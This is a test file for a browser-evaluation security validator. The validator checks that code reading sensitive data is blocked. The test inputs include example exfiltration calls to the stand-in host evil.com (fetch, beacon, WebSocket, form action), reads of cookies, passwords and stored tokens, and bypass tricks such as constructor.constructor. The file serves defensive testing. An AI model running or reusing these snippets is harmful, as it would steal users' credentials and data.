import { describe, expect, it, beforeEach } from "vitest";
import {
  BrowserEvalSecurity,
  validateBrowserEval,
  assertBrowserEvalAllowed,
} from "./eval-security.js";

describe("BrowserEvalSecurity", () => {
  let security: BrowserEvalSecurity;

  beforeEach(() => {
    security = new BrowserEvalSecurity();
  });

  // =========================================================================
  // Code length limits
  // =========================================================================

  describe("code length", () => {
    it("allows code within the length limit", () => {
      const result = security.validate("document.title");
      expect(result.allowed).toBe(true);
    });

    it("blocks code exceeding maxCodeLength", () => {
      const longCode = "a".repeat(10001);
      const result = security.validate(longCode);
      expect(result.allowed).toBe(false);
      expect(result.reason).toContain("maximum length");
    });

    it("allows code exactly at maxCodeLength", () => {
      const exactCode = "a".repeat(10000);
      const result = security.validate(exactCode);
      expect(result.allowed).toBe(true);
    });

    it("respects custom maxCodeLength", () => {
      const custom = new BrowserEvalSecurity({ maxCodeLength: 50 });
      const result = custom.validate("a".repeat(51));
      expect(result.allowed).toBe(false);
    });
  });

  // =========================================================================
  // Sensitive API patterns
  // =========================================================================

  describe("sensitive API blocking", () => {
    it("blocks password access", () => {
      const result = security.validate('document.getElementById("password").value');
      expect(result.allowed).toBe(false);
      expect(result.reason).toContain("sensitive API");
    });

    it("blocks credential access", () => {
      const result = security.validate("navigator.credentials.get()");
      expect(result.allowed).toBe(false);
      expect(result.reason).toContain("sensitive API");
    });

    it("blocks clipboard access", () => {
      const result = security.validate("navigator.clipboard.readText()");
      expect(result.allowed).toBe(false);
    });

    it("blocks execCommand copy", () => {
      const result = security.validate('document.execCommand("copy")');
      expect(result.allowed).toBe(false);
    });

    it("blocks geolocation access", () => {
      const result = security.validate("navigator.geolocation.getCurrentPosition(cb)");
      expect(result.allowed).toBe(false);
    });

    it("blocks camera/microphone access", () => {
      const result = security.validate("navigator.mediaDevices.getUserMedia({video:true})");
      expect(result.allowed).toBe(false);
    });

    it("blocks getUserMedia standalone", () => {
      const result = security.validate("getUserMedia({audio:true})");
      expect(result.allowed).toBe(false);
    });

    it("blocks web workers", () => {
      const result = security.validate('new Worker("malicious.js")');
      expect(result.allowed).toBe(false);
    });

    it("blocks shared workers", () => {
      const result = security.validate('new SharedWorker("shared.js")');
      expect(result.allowed).toBe(false);
    });

    it("blocks service workers", () => {
      const result = security.validate("navigator.serviceWorker.register('sw.js')");
      expect(result.allowed).toBe(false);
    });

    it("blocks IndexedDB open", () => {
      const result = security.validate('indexedDB.open("myDB")');
      expect(result.allowed).toBe(false);
    });

    it("blocks IndexedDB deleteDatabase", () => {
      const result = security.validate('indexedDB.deleteDatabase("myDB")');
      expect(result.allowed).toBe(false);
    });

    it("blocks direct value assignment to inputs", () => {
      const result = security.validate('.value = "injected"');
      expect(result.allowed).toBe(false);
    });

    it("allows when blockSensitiveApis is disabled", () => {
      const permissive = new BrowserEvalSecurity({ blockSensitiveApis: false });
      const result = permissive.validate("navigator.clipboard.readText()");
      expect(result.allowed).toBe(true);
    });
  });

  // =========================================================================
  // Network request patterns
  // =========================================================================

  describe("network request blocking", () => {
    it("blocks fetch calls", () => {
      const result = security.validate('fetch("https://evil.com/steal")');
      expect(result.allowed).toBe(false);
      expect(result.reason).toContain("network request");
    });

    it("blocks XMLHttpRequest", () => {
      const result = security.validate("new XMLHttpRequest()");
      expect(result.allowed).toBe(false);
    });

    it("blocks WebSocket", () => {
      const result = security.validate('new WebSocket("wss://evil.com")');
      expect(result.allowed).toBe(false);
    });

    it("blocks dynamic script creation", () => {
      const result = security.validate('document.createElement("script")');
      expect(result.allowed).toBe(false);
    });

    it("blocks script src assignment", () => {
      const result = security.validate('.src = "https://evil.com/payload.js"');
      expect(result.allowed).toBe(false);
    });

    it("blocks image beacon exfiltration", () => {
      const result = security.validate('new Image().src = "https://evil.com/track"');
      expect(result.allowed).toBe(false);
    });

    it("blocks form action override", () => {
      const result = security.validate('.action = "https://evil.com/collect"');
      expect(result.allowed).toBe(false);
    });

    it("blocks form submission", () => {
      const result = security.validate("document.forms[0].submit()");
      expect(result.allowed).toBe(false);
    });

    it("blocks sendBeacon", () => {
      const result = security.validate('navigator.sendBeacon("https://evil.com", data)');
      expect(result.allowed).toBe(false);
    });

    it("blocks EventSource", () => {
      const result = security.validate('new EventSource("https://evil.com/events")');
      expect(result.allowed).toBe(false);
    });

    it("blocks new Request", () => {
      const result = security.validate('new Request("https://evil.com")');
      expect(result.allowed).toBe(false);
    });

    it("allows when blockNetworkRequests is disabled", () => {
      const permissive = new BrowserEvalSecurity({ blockNetworkRequests: false });
      const result = permissive.validate('fetch("/api/data")');
      expect(result.allowed).toBe(true);
    });
  });

  // =========================================================================
  // Storage access patterns
  // =========================================================================

  describe("storage access blocking", () => {
    it("blocks localStorage.setItem", () => {
      const result = security.validate('localStorage.setItem("key", "value")');
      expect(result.allowed).toBe(false);
      expect(result.reason).toContain("storage modification");
    });

    it("blocks localStorage.removeItem", () => {
      const result = security.validate('localStorage.removeItem("key")');
      expect(result.allowed).toBe(false);
    });

    it("blocks localStorage.clear", () => {
      const result = security.validate("localStorage.clear()");
      expect(result.allowed).toBe(false);
    });

    it("blocks sessionStorage.setItem", () => {
      const result = security.validate('sessionStorage.setItem("key", "value")');
      expect(result.allowed).toBe(false);
    });

    it("blocks sessionStorage.removeItem", () => {
      const result = security.validate('sessionStorage.removeItem("key")');
      expect(result.allowed).toBe(false);
    });

    it("blocks sessionStorage.clear", () => {
      const result = security.validate("sessionStorage.clear()");
      expect(result.allowed).toBe(false);
    });

    it("allows when blockStorageAccess is disabled", () => {
      const permissive = new BrowserEvalSecurity({ blockStorageAccess: false });
      const result = permissive.validate('localStorage.setItem("key", "val")');
      expect(result.allowed).toBe(true);
    });
  });

  // =========================================================================
  // Cookie access patterns
  // =========================================================================

  describe("cookie access blocking", () => {
    it("blocks document.cookie", () => {
      const result = security.validate("document.cookie");
      expect(result.allowed).toBe(false);
      expect(result.reason).toContain("cookie access");
    });

    it("blocks cookieStore API", () => {
      const result = security.validate('cookieStore.get("session")');
      expect(result.allowed).toBe(false);
    });

    it("allows when blockCookieAccess is disabled", () => {
      const permissive = new BrowserEvalSecurity({ blockCookieAccess: false });
      const result = permissive.validate("document.cookie");
      expect(result.allowed).toBe(true);
    });
  });

  // =========================================================================
  // Warning-level checks (allowed but flagged)
  // =========================================================================

  describe("eval and Function constructor blocking", () => {
    it("blocks eval() usage", () => {
      const result = security.validate('eval("1+1")');
      expect(result.allowed).toBe(false);
      expect(result.reason).toContain("eval()");
    });

    it("blocks Function constructor", () => {
      const result = security.validate('new Function("return 1")');
      expect(result.allowed).toBe(false);
      expect(result.reason).toContain("Function constructor");
    });
  });

  describe("warning-level checks", () => {
    it("warns on innerHTML assignment but allows", () => {
      const result = security.validate('el.innerHTML = "<b>bold</b>"');
      expect(result.allowed).toBe(true);
      expect(result.warnings).toContain("Warning: innerHTML assignment detected - potential XSS");
    });

    it("warns on document.write but allows", () => {
      const result = security.validate('document.write("<p>hello</p>")');
      expect(result.allowed).toBe(true);
      expect(result.warnings).toContain("Warning: document.write usage detected");
    });

    it("returns no warnings for clean code", () => {
      const result = security.validate("document.title");
      expect(result.allowed).toBe(true);
      expect(result.warnings).toBeUndefined();
    });

    it("can accumulate multiple warnings", () => {
      const result = security.validate('el.innerHTML = "<div>x</div>"; document.write("y")');
      expect(result.allowed).toBe(true);
      expect(result.warnings?.length).toBeGreaterThanOrEqual(2);
    });
  });

  // =========================================================================
  // Safe code that should be allowed
  // =========================================================================

  describe("allows safe code", () => {
    it("allows reading document.title", () => {
      expect(security.validate("document.title").allowed).toBe(true);
    });

    it("allows querying elements", () => {
      expect(security.validate('document.querySelector(".btn")').allowed).toBe(true);
    });

    it("allows reading textContent", () => {
      expect(security.validate("document.body.textContent").allowed).toBe(true);
    });

    it("allows JSON operations", () => {
      expect(security.validate("JSON.stringify({a: 1})").allowed).toBe(true);
    });

    it("allows Math operations", () => {
      expect(security.validate("Math.random()").allowed).toBe(true);
    });

    it("blocks localStorage read access (token exfiltration prevention)", () => {
      expect(security.validate('localStorage.getItem("key")').allowed).toBe(false);
    });

    it("allows Array operations", () => {
      expect(security.validate("[1,2,3].map(x => x * 2)").allowed).toBe(true);
    });

    it("allows reading window.location.href", () => {
      expect(security.validate("window.location.href").allowed).toBe(true);
    });

    it("blocks writing window.location.href", () => {
      expect(security.validate('window.location.href = "https://evil.com"').allowed).toBe(false);
    });
  });

  // =========================================================================
  // Case insensitivity
  // =========================================================================

  describe("case insensitivity", () => {
    it("blocks PASSWORD in any case", () => {
      expect(security.validate("PASSWORD").allowed).toBe(false);
      expect(security.validate("Password").allowed).toBe(false);
    });

    it("blocks FETCH in any case", () => {
      expect(security.validate('FETCH("url")').allowed).toBe(false);
    });

    it("blocks LOCALSTORAGE.SETITEM in any case", () => {
      expect(security.validate('LOCALSTORAGE.SETITEM("k","v")').allowed).toBe(false);
    });
  });

  // =========================================================================
  // Bypass attempt patterns
  // =========================================================================

  describe("bypass attempts", () => {
    it("catches obfuscated fetch with whitespace", () => {
      const result = security.validate('fetch  ("https://evil.com")');
      expect(result.allowed).toBe(false);
    });

    it("catches WebSocket with extra whitespace", () => {
      const result = security.validate('new  WebSocket  ("wss://evil.com")');
      expect(result.allowed).toBe(false);
    });

    it("catches Worker with extra whitespace", () => {
      const result = security.validate('new  Worker  ("worker.js")');
      expect(result.allowed).toBe(false);
    });

    it("blocks String.fromCharCode bypass", () => {
      const result = security.validate("String.fromCharCode(102,101,116,99,104)");
      expect(result.allowed).toBe(false);
      expect(result.reason).toContain("indirect API access");
    });

    it("blocks prototype chain abuse via constructor.constructor", () => {
      const result = security.validate('[].constructor.constructor("return fetch")()');
      expect(result.allowed).toBe(false);
    });

    it("blocks setTimeout with Function argument", () => {
      const result = security.validate('setTimeout(new Function("fetch(url)"), 0)');
      expect(result.allowed).toBe(false);
    });

    it("blocks setTimeout with string argument", () => {
      const result = security.validate('setTimeout("fetch(url)", 0)');
      expect(result.allowed).toBe(false);
    });

    it("blocks document.domain assignment", () => {
      const result = security.validate('document.domain = "evil.com"');
      expect(result.allowed).toBe(false);
    });

    it("blocks window.location.href assignment", () => {
      const result = security.validate('window.location.href = "https://evil.com"');
      expect(result.allowed).toBe(false);
    });

    it("blocks Object introspection on window", () => {
      const result = security.validate("Object.getOwnPropertyNames(window)");
      expect(result.allowed).toBe(false);
    });

    it("blocks localStorage bracket notation", () => {
      const result = security.validate('localStorage["token"]');
      expect(result.allowed).toBe(false);
    });

    it("blocks sessionStorage.getItem read", () => {
      const result = security.validate('sessionStorage.getItem("auth")');
      expect(result.allowed).toBe(false);
    });
  });

  // =========================================================================
  // Logging
  // =========================================================================

  describe("logEvaluation", () => {
    it("logs allowed evaluations", () => {
      security.logEvaluation({ code: "document.title", allowed: true });
      const log = security.getEvalLog();
      expect(log).toHaveLength(1);
      expect(log[0].allowed).toBe(true);
    });

    it("logs blocked evaluations with reason", () => {
      security.logEvaluation({
        code: 'fetch("evil")',
        allowed: false,
        reason: "network blocked",
      });
      const log = security.getEvalLog();
      expect(log).toHaveLength(1);
      expect(log[0].allowed).toBe(false);
      expect(log[0].reason).toBe("network blocked");
    });

    it("truncates logged code to 500 chars", () => {
      const longCode = "x".repeat(1000);
      security.logEvaluation({ code: longCode, allowed: true });
      const log = security.getEvalLog();
      expect(log[0].code.length).toBe(500);
    });

    it("trims log when exceeding maxLogSize", () => {
      for (let i = 0; i < 1100; i++) {
        security.logEvaluation({ code: `code-${i}`, allowed: true });
      }
      const log = security.getEvalLog(2000);
      // After exceeding 1000, should trim to 500
      expect(log.length).toBeLessThanOrEqual(600);
    });

    it("does not log when logEvaluations is disabled", () => {
      const quiet = new BrowserEvalSecurity({ logEvaluations: false });
      quiet.logEvaluation({ code: "test", allowed: true });
      expect(quiet.getEvalLog()).toHaveLength(0);
    });

    it("includes targetId and ref in log entries", () => {
      security.logEvaluation({
        code: "test",
        allowed: true,
        targetId: "tab-1",
        ref: "btn-click",
      });
      const log = security.getEvalLog();
      expect(log[0].targetId).toBe("tab-1");
      expect(log[0].ref).toBe("btn-click");
    });
  });

  // =========================================================================
  // Listeners
  // =========================================================================

  describe("onEvaluation", () => {
    it("notifies listeners on evaluation", () => {
      const entries: unknown[] = [];
      security.onEvaluation((entry) => entries.push(entry));
      security.logEvaluation({ code: "test", allowed: true });
      expect(entries).toHaveLength(1);
    });

    it("returns an unsubscribe function", () => {
      const entries: unknown[] = [];
      const unsub = security.onEvaluation((entry) => entries.push(entry));
      security.logEvaluation({ code: "test1", allowed: true });
      unsub();
      security.logEvaluation({ code: "test2", allowed: true });
      expect(entries).toHaveLength(1);
    });

    it("ignores listener errors", () => {
      security.onEvaluation(() => {
        throw new Error("listener error");
      });
      // Should not throw
      expect(() => {
        security.logEvaluation({ code: "test", allowed: true });
      }).not.toThrow();
    });
  });

  // =========================================================================
  // getEvalLog filtering
  // =========================================================================

  describe("getEvalLog", () => {
    it("filters blocked-only entries", () => {
      security.logEvaluation({ code: "ok", allowed: true });
      security.logEvaluation({ code: "bad", allowed: false, reason: "blocked" });
      security.logEvaluation({ code: "ok2", allowed: true });
      const blocked = security.getEvalLog(100, true);
      expect(blocked).toHaveLength(1);
      expect(blocked[0].code).toBe("bad");
    });

    it("respects limit parameter", () => {
      for (let i = 0; i < 10; i++) {
        security.logEvaluation({ code: `code-${i}`, allowed: true });
      }
      const limited = security.getEvalLog(3);
      expect(limited).toHaveLength(3);
    });
  });

  // =========================================================================
  // getStats
  // =========================================================================

  describe("getStats", () => {
    it("returns correct counts", () => {
      security.logEvaluation({ code: "ok1", allowed: true });
      security.logEvaluation({ code: "ok2", allowed: true });
      security.logEvaluation({ code: "bad", allowed: false, reason: "net" });
      const stats = security.getStats();
      expect(stats.totalAttempts).toBe(3);
      expect(stats.allowedAttempts).toBe(2);
      expect(stats.blockedAttempts).toBe(1);
      expect(stats.byReason["net"]).toBe(1);
    });

    it("groups by reason", () => {
      security.logEvaluation({ code: "a", allowed: false, reason: "net" });
      security.logEvaluation({ code: "b", allowed: false, reason: "net" });
      security.logEvaluation({ code: "c", allowed: false, reason: "api" });
      const stats = security.getStats();
      expect(stats.byReason["net"]).toBe(2);
      expect(stats.byReason["api"]).toBe(1);
    });

    it("uses 'unknown' for blocked entries without reason", () => {
      security.logEvaluation({ code: "x", allowed: false });
      const stats = security.getStats();
      expect(stats.byReason["unknown"]).toBe(1);
    });
  });

  // =========================================================================
  // Config management
  // =========================================================================

  describe("config management", () => {
    it("returns a copy of config", () => {
      const config = security.getConfig();
      config.maxCodeLength = 1;
      expect(security.getConfig().maxCodeLength).toBe(10000);
    });

    it("updates config at runtime", () => {
      security.updateConfig({ maxCodeLength: 100 });
      expect(security.getConfig().maxCodeLength).toBe(100);
      // Other fields unchanged
      expect(security.getConfig().blockSensitiveApis).toBe(true);
    });
  });

  // =========================================================================
  // Module-level helpers
  // =========================================================================

  describe("validateBrowserEval", () => {
    it("validates using the singleton", () => {
      const result = validateBrowserEval("document.title");
      expect(result.allowed).toBe(true);
    });

    it("blocks dangerous code via singleton", () => {
      const result = validateBrowserEval('fetch("https://evil.com")');
      expect(result.allowed).toBe(false);
    });
  });

  describe("assertBrowserEvalAllowed", () => {
    it("does not throw for safe code", () => {
      expect(() => {
        assertBrowserEvalAllowed({ code: "document.title" });
      }).not.toThrow();
    });

    it("throws for dangerous code", () => {
      expect(() => {
        assertBrowserEvalAllowed({ code: 'fetch("https://evil.com")' });
      }).toThrow("Browser evaluate blocked");
    });

    it("includes security guidance in error message", () => {
      expect(() => {
        assertBrowserEvalAllowed({ code: "navigator.clipboard.readText()" });
      }).toThrow("contact your administrator");
    });
  });
});
